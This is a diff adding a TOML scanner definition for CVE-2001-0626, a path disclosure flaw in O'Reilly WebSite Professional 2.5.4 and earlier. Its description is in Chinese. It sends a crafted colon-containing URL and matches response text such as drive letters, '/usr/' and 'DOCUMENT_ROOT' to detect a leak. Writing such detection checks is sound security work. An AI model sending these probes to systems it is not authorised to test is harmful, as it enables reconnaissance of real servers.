@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 OReilly Website Professional 2.5.4 及更早版本路径泄露漏洞。向目标发送包含冒号的特制 URL 请求，若服务器返回物理路径信息则判定存在漏洞。"
+id = "POC-AVE-2001-0268"
+name = "OReilly Website Professional 路径泄露 PoC"
+severity = "high"
+tags = ["cve-2001-0626"]
+vuln_id = [
+    "CVE-2001-0626",
+    "AVE-2001-0268",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/:/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "drive ",
+    '\:',
+    'C:\',
+    'D:\',
+    "root:",
+    "/usr/",
+    "/var/",
+    "physical path",
+    "Server Path",
+    "DOCUMENT_ROOT",
+    "APPL_PHYSICAL_PATH",
+]
